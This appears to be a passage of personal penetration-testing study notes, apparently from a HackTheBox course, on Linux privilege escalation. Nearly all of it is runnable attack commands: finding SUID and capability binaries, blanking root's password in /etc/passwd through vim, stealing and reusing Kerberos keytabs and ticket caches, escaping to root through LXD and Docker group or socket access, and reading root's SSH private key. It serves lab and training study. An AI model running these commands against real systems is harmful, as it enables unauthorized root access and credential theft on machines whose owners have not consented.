          gcc -fPIC -shared -o root.so root.c -nostartfiles

      SUID/SGID propietary execution

      • SUID The prcoess runs with the permissions of the owner 
        • -rwsr-xr-x 1 root root file.txt  #Take a look where the s is

        List files with SUID (In this case we are filtering by root user but we can remove it)

        find / -type f -user root -perm -4000 2>/dev/null

      • SUID The process runs with the permissions of the group owner of the file
        • -rwxr-sr-x 1 root adm file.txt  #Take a look where the s is
        find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

      We can use the following command to filter for the

      find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

      Find world-executable folders 

      find / -type d -writable 2>/dev/null

    Capabilities

      Check for caps 

      getcap -r / 2>/dev/null

      Sometimes this command will not work so you can use the following which search for getcap in multiple directories

      find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

      There are several linux capabilities that can be used to escalte user's privilege to root

      • cap_setuid Allows to change the UID of a process. Root UID is 0
      • cap_setgid Allows to change the GID of a process Root UID is 0
      • cap_sys_admin Very dangerous since allows many things almos equivalent to root
      • cap_dac_override Allows to bypass the UAC of files allowing you read and write any file

        • Here goes an example where we have cap_dac_override and we modify the /etc/passwd in order to remove root password

        echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

    Linux Domain joined machine

      It is posible to find a linux box which is in a Windows domain. Here you can find information about how to approach this scenario

      Enumeration

        Checking if a machine is domain joined. Additionally you can check the groups the computer belongs and more

        realm list

        We also can check the /etc/resolv.conf file in order to see if the host is configured to use internal DNS. And even the arp table to check which hosts have that server communicated with

        arp -a

      Finding kerberos tickets

        Tickets in linux systems are normally found in .keytab files an easy way to find them is by using

        find / -name *keytab* -ls 2>/dev/null

        Another way is by finding cronjobs

        crontab -l

        Another example is ccache files the path to this ones can be located by showing the content of KRB5CCNAME envrionmental variables (/tmp)

        env | grep -i krb5

        Once we found a ticket we can use klist to view information about this one

        klist -c ccname_ticket-name

      Abusing keytabs

        klist itself can be used to show which username you are using also you can use the following to show information about a ticket

        klist -k -t /opt/specialfiles/carlos.keytab

        We can impersonate a user using a ticket by using

        kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

      Extracting hashes

        We can use keytabextract.py in order to extract the hashes from a ticket

        python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

        Once you cracked the password you can simply login by using

        su carlos@inlanefreight.htb

      Loading ticket from cache

        In case you found a ticket inside /tmp you can use it by doing. First of all copy the ticket from /tmp to /root

        cp krb5cc_647401106_uN5uvk /root/

        Then export the ticket

        export KRB5CCNAME=/root/krb5cc_647401106_uN5uvk

        Check that you have exported the ticket correctly

        klist

        Finally use the exported ticket by issuing the -k flag .Example:

        smbclient //dc01/C$ -k -c ls -no-pass

    Privileged groups

      First check your groups by using id command

      LXC / LXD group

        LXD is similar to Docker and is Ubuntu's container manager. With this group you'll be able to obtain a shell as root

        Go to the following github repo and download the image (tar.gz) file

        https://github.com/saghul/lxd-alpine-builder

        In case you would like to create a recent image you can clone de repo and follow the steps to create it. Once you have the file transfer it to the victim

        Import the image

        lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp

        List images to check we did it correctly

        lxc image list

        Disables all isolation features that allow us to act on the host.

        lxc init ubuntutemp privesc -c security.privileged=true

        Add the root directory of our original machine where privesc is the name of the container

        lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

        Start the container 

        lxc start privesc

        Obtain a shell inside the container

        lxc exec privesc /bin/bash #OR
lxc exec privesc /bin/sh

        In order to check the original host disk device just go to /mnt/root/

      Docker group

        In case you are in docker group youll be able to read any file on the system. By running the following command youll create a new container mounting the /root folder

        docker run -v /root:/mnt -it ubuntu

        Docker socket

          In some cases we will find a file called docker.sock which is a special file that allows us and processes to communicate with the Docker daemon. Using that file we can create a new container mounting the host filesystem

          Normally this file is located in

          /var/run/docker.sock
/run/docker.sock

          First check if we have the docker binary if negative download it from here

          Then check if we can list containers using the socket

          /tmp/docker -H unix:///app/docker.sock ps

          Create a new privileged container mounting the host filesystem. In case you dont have any image you can check the docker ps if there are other containers and use the same image or even you can do docker image ls to list images

          /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem docker_image
#In case your container stops just after running the command use sleep infinity
docker -H unix:///run/docker.sock run -d --privileged -v /:/hostsystem ubuntu sleep infinity

          You can list again containers to check if all was okay

          /tmp/docker -H unix:///app/docker.sock ps

          Now access the container

          /tmp/docker -H unix:///app/docker.sock exec -it container_id /bin/bash

          Access the host filesystem

          cat /hostsystem/root/.ssh/id_rsa
        Docker socket without privileges

          In case we are not in docker group we still be able to access host filesystem but there is one condition. Docker socket must be writable then we can use

          docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

        Users within the disk group have full access to any devices contained within /dev also /dev/sda1 which is the main device. An attacker whith this privielged can use debugfs to access the full filesystem
